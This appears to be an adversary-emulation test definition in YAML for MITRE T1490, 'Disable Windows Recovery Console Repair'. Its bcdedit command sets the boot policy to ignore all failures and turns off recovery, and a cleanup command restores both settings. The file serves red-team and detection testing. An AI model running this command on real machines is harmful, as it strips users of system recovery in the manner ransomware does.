- requirements: []
  name: Soumaia ART Tests - Windows - Disable Windows Recovery Console Repair
  description: 'Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.

    Upon execution, "The operation completed successfully." will be displayed in the powershell session. (requires elevation)'
  tactic: impact
  technique_id: T1490
  technique_name: Inhibit System Recovery
  executors:
  - cleanup:
    - bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1 & bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit.exe /set {default} recoveryenabled no
  id: 480c2a43-1482-5c63-9d8b-69d892ca602b
